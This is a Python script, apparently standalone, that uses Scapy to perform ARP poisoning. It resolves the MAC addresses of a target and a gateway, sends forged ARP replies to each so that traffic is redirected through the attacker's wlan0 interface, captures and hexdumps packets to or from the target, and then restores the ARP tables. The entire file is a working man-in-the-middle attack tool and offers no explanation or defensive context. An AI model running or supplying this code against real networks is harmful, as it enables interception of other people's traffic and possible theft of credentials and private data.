from scapy.all import *
import sys
import time


def get_mac_address(ip_address):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
    answered, unanswered = srp(packet, timeout=2, verbose=0)

    for sent,received in answered:
        # print(s.show())
        # print(r.show())
        return received[ARP].hwsrc

def restore_arp_tables(gateway_ip, gateway_mac, target_ip, target_mac):
    print("Restoring...")
    gateway_to_target = Ether()/ARP(op=2, hwsrc= gateway_mac, psrc= gateway_ip, pdst= target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    target_to_gateway = Ether()/ARP(op=2, hwsrc= target_mac, psrc= target_ip, pdst= gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
    send(gateway_to_target, count=10, verbose= 0)
    send(target_to_gateway, count=10, verbose= 0)
    print("Restoring done...")

def poison_arp_tables(gateway_ip, gateway_mac, target_ip, target_mac):

    print("Poisoning.....")
    gateway_to_target = ARP(op=2, hwdst= target_mac, psrc= gateway_ip, pdst= target_ip)
    target_to_gateway = ARP(op=2, hwdst= gateway_mac, psrc= target_ip, pdst= gateway_ip)
    try:
        send(gateway_to_target, verbose=0)
        send(target_to_gateway, verbose=0)
    except Exception as e:
        sys.exit()
    print("Poisoning done...")

def sniffer(intf, target_ip):
    filter_string = "ip host " + target_ip
    packets = sniff(iface=intf, count=10, filter= filter_string)

    for i in range(len(packets)):
        print("SIZE: " + str(sys.getsizeof(packets[i])))
        try:
            print(hexdump(raw(packets[i])))
        except Exception as e:
            print(str(e))

def main():
    conf.iface = "wlan0"
    # assuming we have performed the reverse attack, we know the following\

    TARGET_IP = sys.argv[1]
    GATEWAY_IP = sys.argv[2]

    TARGET_MAC_ADDRESS = get_mac_address(TARGET_IP)

    GATEWAY_MAC_ADDRESS = get_mac_address(GATEWAY_IP)

    poison_arp_tables(GATEWAY_IP, GATEWAY_MAC_ADDRESS, TARGET_IP, TARGET_MAC_ADDRESS)

    sniffer("wlan0", TARGET_IP)

    restore_arp_tables(GATEWAY_IP, GATEWAY_MAC_ADDRESS, TARGET_IP, TARGET_MAC_ADDRESS)



main()